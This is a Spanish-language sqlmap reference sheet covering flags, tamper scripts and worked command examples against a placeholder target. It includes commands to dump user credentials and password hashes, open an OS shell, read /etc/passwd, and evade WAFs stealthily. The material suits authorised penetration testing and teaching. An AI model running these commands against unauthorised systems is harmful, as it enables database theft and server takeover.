# SQLMap - Referencia

Herramienta de automatizacion de SQL Injection. Detecta y explota SQLi en parametros GET, POST, cookies, headers y APIs JSON.

## Instalacion

```bash
sudo apt install sqlmap                   # Kali/Debian
pip install --upgrade sqlmap              # pip
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git  # GitHub
sqlmap --update                           # Actualizar
```

## Tecnicas (--technique BEUSTQ)

| Codigo | Tecnica | Descripcion |
|--------|---------|-------------|
| **B** | Boolean-based blind | True/False via diferencias en response |
| **E** | Error-based | Datos extraidos de mensajes de error |
| **U** | UNION query-based | UNION SELECT. La mas rapida |
| **S** | Stacked queries | Multiples queries con `;` |
| **T** | Time-based blind | Inferir via delay (SLEEP, BENCHMARK) |
| **Q** | Inline queries | Subqueries dentro del query original |

Default: BEUSTQ (todas). Subconjunto: `--technique=BEU`.

## Flags Principales

### Target
```
-u URL                  URL objetivo con parametro
-r REQUESTFILE          Request desde archivo (guardado de Caido/Burp)
--data=DATA             POST data
-g GOOGLEDORK           Buscar en Google y usar resultados
-l LOGFILE              Parse de log de proxy
-m BULKFILE             Multiples targets desde archivo
```

### Request
```
--cookie=COOKIE         Cookie HTTP
--headers=HEADERS       Headers extra
--user-agent=AGENT      User-Agent custom
--random-agent          User-Agent aleatorio
--referer=REFERER       Referer HTTP
--method=METHOD         Metodo HTTP forzado (PUT, DELETE, etc)
--proxy=PROXY           Proxy HTTP (ej: http://127.0.0.1:8080)
--tor                   Usar Tor
--auth-type=TYPE        Auth HTTP: Basic, Digest, NTLM
--auth-cred=CRED        Credenciales HTTP (user:pass)
--delay=DELAY           Delay en segundos entre requests
--timeout=TIMEOUT       Timeout (default 30s)
--safe-url=URL          URL a visitar periodicamente para evitar bloqueo
--safe-freq=FREQ        Visitar safe-url cada N requests
```

### Inyeccion
```
-p PARAMETER            Parametro(s) a probar
--skip=SKIP             Saltar parametro(s)
--dbms=DBMS             Forzar DBMS (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
--technique=TECH        Tecnicas a usar (default BEUSTQ)
--level=LEVEL           Nivel de pruebas (1-5, default 1)
--risk=RISK             Riesgo de pruebas (1-3, default 1)
--prefix=PREFIX         Prefijo de payload
--suffix=SUFFIX         Sufijo de payload
--tamper=TAMPER         Tamper script(s) para bypass de WAF
--second-url=URL        URL de resultado para second-order SQLi
```

**Niveles:**
- 1: Default, GET/POST params
- 2: +Cookie header
- 3: +User-Agent y Referer
- 4: Mas payloads
- 5: Maximo incluyendo Host header

**Riesgo:**
- 1: Payloads inofensivos
- 2: +Heavy time-based
- 3: +OR-based (puede modificar datos en UPDATE)

### Enumeracion
```
--dbs                   Listar databases
--tables                Listar tablas
--columns               Listar columnas
--dump                  Volcar datos de tabla
--dump-all              Volcar todas las tablas
-D DB                   Database objetivo
-T TABLE                Tabla objetivo
-C COLUMNS              Columna(s) objetivo
--current-user          Usuario actual del DBMS
--current-db            Database actual
--is-dba                Es el usuario DBA?
--users                 Enumerar usuarios DBMS
--passwords             Enumerar hashes de passwords
--privileges            Enumerar privilegios
--banner                Banner del DBMS
--schema                Schema del DBMS
--count                 Contar entradas
--search                Buscar columnas/tablas/databases
```

### OS / Archivos
```
--os-shell              Shell interactivo OS
--os-cmd=COMMAND        Ejecutar comando OS
--sql-shell             Shell SQL interactivo
--file-read=FILE        Leer archivo del servidor
--file-write=FILE       Archivo local a escribir en servidor
--file-dest=DEST        Path destino en servidor
```

### General
```
--batch                 Sin interaccion, usar defaults
--forms                 Auto-parsear y probar formularios
--crawl=DEPTH           Crawlear la web desde la URL
--threads=THREADS       Threads (default 1, max 10)
--flush-session         Limpiar sesion del target
-v VERBOSE              Verbosidad (0-6, default 1)
```

## Tamper Scripts Utiles para WAF Bypass

```bash
# Reemplazo de espacios
space2comment          # Espacios -> /**/
space2plus             # Espacios -> +
space2randomblank      # Espacios -> chars aleatorios
space2hash             # Espacios -> # + newline (MySQL)

# Encoding
charencode             # URL-encode todos los chars
chardoubleencode       # Double URL-encode
charunicodeencode      # Unicode URL-encode (ASP/IIS)
base64encode           # Base64

# Ofuscacion de keywords
randomcase             # SeLeCt, UnIoN
randomcomments         # S/**/EL/**/ECT
versionedkeywords      # /*!keyword*/ (MySQL)

# Comparacion/logica
between                # > -> NOT BETWEEN 0 AND
equaltolike            # = -> LIKE
greatest               # > -> GREATEST

# Quotes
apostrophemask         # ' -> %EF%BC%87
unmagicquotes          # ' -> %bf%27 (bypass magic_quotes)

# WAF-specific
modsecurityversioned   # Bypass ModSecurity
securesphere           # Bypass Imperva SecureSphere
```

**Stackear tampers:**
```bash
sqlmap -u "http://target.com/?id=1" --tamper=space2comment,charencode,randomcase
```

## Ejemplos Practicos

```bash
# GET param basico
sqlmap -u "http://target.com/page?id=1" --batch

# Especificar parametro
sqlmap -u "http://target.com/page?id=1&cat=5" -p id --batch

# Level y risk altos
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --batch

# POST data
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" -p user --batch

# Desde request guardado
sqlmap -r request.txt --batch

# Auto-detectar forms
sqlmap -u "http://target.com/login" --forms --batch

# Cookie injection
sqlmap -u "http://target.com/page" --cookie="session=abc; role=user" -p role --level=2 --batch

# JSON API
sqlmap -u "http://target.com/api/search" --data='{"query":"test"}' \
  --content-type="application/json" -p query --batch

# Header injection (marca con *)
sqlmap -u "http://target.com/" --headers="X-Forwarded-For: 1*" --batch

# Workflow completo: dbs -> tables -> columns -> dump
sqlmap -u "http://target.com/page?id=1" --dbs --batch
sqlmap -u "http://target.com/page?id=1" -D targetdb --tables --batch
sqlmap -u "http://target.com/page?id=1" -D targetdb -T users --columns --batch
sqlmap -u "http://target.com/page?id=1" -D targetdb -T users -C "username,password" --dump --batch

# OS Shell
sqlmap -u "http://target.com/page?id=1" --os-shell --batch

# Leer archivo del servidor
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd" --batch

# Crawl + forms
sqlmap -u "http://target.com/" --crawl=3 --forms --batch --threads=5

# Via proxy
sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080" --batch

# Stealth completo
sqlmap -u "http://target.com/page?id=1" --random-agent \
  --tamper=space2comment,charencode,randomcase --delay=3 \
  --safe-url="http://target.com/" --safe-freq=5 --level=5 --risk=3 --batch

# Second-order injection
sqlmap -u "http://target.com/register" --data="username=test&password=pass" \
  --second-url="http://target.com/profile" --batch

# Info del usuario/DB/DBA
sqlmap -u "http://target.com/page?id=1" --current-user --current-db --is-dba --batch
```
